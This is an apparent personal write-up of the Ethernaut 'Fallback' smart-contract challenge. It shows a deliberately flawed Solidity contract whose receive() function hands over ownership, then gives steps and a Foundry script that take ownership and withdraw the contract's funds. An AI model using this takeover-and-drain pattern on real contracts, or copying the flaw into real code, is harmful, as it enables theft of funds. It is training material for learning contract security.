---
title: "Fallback"
date: "2024-02-12T09:15:00.000Z"
lastmod: "2024-02-12T09:28:00.000Z"
draft: false
type: "docs"
Difficulty: "⭐"
Date: "2024-01-07"
prev: "fal1out-adc1e96866bc443c8f73279d9d54ddcc"
State: "Terminé"
NOTION_METADATA:
  object: "page"
  id: "3b8b2299-aa21-4a02-b189-968fcb7e63fb"
  created_time: "2024-02-12T09:15:00.000Z"
  last_edited_time: "2024-02-12T09:28:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel1.svg"
  parent:
    type: "database_id"
    database_id: "8eb542ce-cd0a-4616-90c5-674614439ec0"
  archived: false
  properties:
    type:
      id: "AcKd"
      type: "select"
      select:
        id: "YEpZ"
        name: "docs"
        color: "default"
    Difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "FPYQ"
        name: "⭐"
        color: "gray"
    Date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-01-07"
        end: null
        time_zone: null
    next:
      id: "%5Eru%5C"
      type: "rich_text"
      rich_text: []
    prev:
      id: "a%5Dip"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "fal1out-adc1e96866bc443c8f73279d9d54ddcc"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "fal1out-adc1e96866bc443c8f73279d9d54ddcc"
          href: null
    State:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    URL:
      id: "juZs"
      type: "url"
      url: null
    Name:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Fallback"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Fallback"
          href: null
  url: "https://www.notion.so/Fallback-3b8b2299aa214a02b189968fcb7e63fb"
  public_url: null
UPDATE_TIME: "2024-02-12T09:30:51.181Z"
EXPIRY_TIME: "2024-02-12T10:30:42.701Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">

- How to send ether when interacting with an ABI

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/84bfeab1-c35b-45ab-a346-76e13736aabe/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240212%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240212T093042Z&X-Amz-Expires=3600&X-Amz-Signature=0770d359694c9fcf981b559b0a904cfebc08398f82f9725e040def77e7723751&X-Amz-SignedHeaders=host&x-id=GetObject)

- How to send ether outside of the ABI
- Converting to and from wei/ether units (see `help()` command)
- Fallback methods

	![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/b4ce3656-36aa-4beb-bc96-ece2f5a7c0ba/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240212%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240212T093043Z&X-Amz-Expires=3600&X-Amz-Signature=a2d2b34790079c622282533debfcd0c7dfce1c3d08d83389140841e5ac4a2456&X-Amz-SignedHeaders=host&x-id=GetObject)


	![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/c4aa3c76-5994-4d9d-82a5-9042c15a0b75/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240212%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240212T093043Z&X-Amz-Expires=3600&X-Amz-Signature=281cd13fed4f0d038d28394913027906393064c87581678d0f56afef39b33b29&X-Amz-SignedHeaders=host&x-id=GetObject)


	```solidity
	// SPDX-License-Identifier: MIT
	pragma solidity ^0.8.0;
	
	contract Fallback {
	
	  mapping(address => uint) public contributions;
	  address public owner;
	
	  constructor() {
	    owner = msg.sender;
	    contributions[msg.sender] = 1000 * (1 ether);
	  }
	
	  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }
	
	  function contribute() public payable {
	    require(msg.value < 0.001 ether);
	    contributions[msg.sender] += msg.value;
	    if(contributions[msg.sender] > contributions[owner]) {
	      owner = msg.sender;
	    }
	  }
	
	  function getContribution() public view returns (uint) {
	    return contributions[msg.sender];
	  }
	
	  function withdraw() public onlyOwner {
	    payable(owner).transfer(address(this).balance);
	  }
	
	  receive() external payable {
	    require(msg.value > 0 && contributions[msg.sender] > 0);
	    owner = msg.sender;
	  }
	}
	```

	1. Call the `contribute()` function with a value set to 1 wei.
	1. Call `senTransaction()` with 1 wei also to get ownership of the contract.
	1. Call `withdraw()` to extract the funds from the contract.

	This is frustrating to using the web console to interact with the contract. So I will try to redo the challenge but using foundry this time.


	Let’s start with the same template as before but with the new contract instance address:


	```solidity
	// SPDX-License-Identifier: UNLICENSED
	pragma solidity ^0.8.13;
	
	import "forge-std/Script.sol";
	
	interface Callee {
	}
	
	
	contract POC is Script {
	    Callee level0 = Callee(0xCe9D58330C2623e00018a10164399238723A4F01);
	    function run() external {
	        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
	        vm.startBroadcast(deployerPrivateKey);
	
	
	        vm.stopBroadcast();
	    }
	}
	```


	It is stated that we have to :

	1. claim ownership of the contract
	1. reduce its balance to 0

	This time it’s easier to get the contract interface since we directly have access to the contract source code.


	```solidity
	interface Callee {
	  function owner() view external returns(address);
	  function contribute() external payable;
	  function withdraw() external;
	  function getContribution() external view returns (uint);
	}
	```


	This is the corresponding interface of the function we are going to utilize.


	From here, everything is quite simple. After a close look at the contract source code we came with the following PoC:


	```solidity
	contract POC is Script {
	    Callee level1 = Callee(0x7f584a9D74D461eFDaD062AA9AfEe9629b96c780);
	    function run() external {
	        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
	        vm.startBroadcast(deployerPrivateKey);
	
	        console.logUint(level1.getContribution());
	        console.logAddress(level1.owner());
	
	        level1.contribute{value: 1}();
	        (bool sent,bytes memory data) = address(level1).call{value: 1}("");
	        require(sent, "Failed to sennd Ether");
	        console.logBytes(data);
	
	
	        console.logUint(level1.getContribution());
	
	        level1.withdraw();
	
	        console.logUint(level1.getContribution());
	        console.logAddress(level1.owner());
	
	        vm.stopBroadcast();
	    }
	}
	```

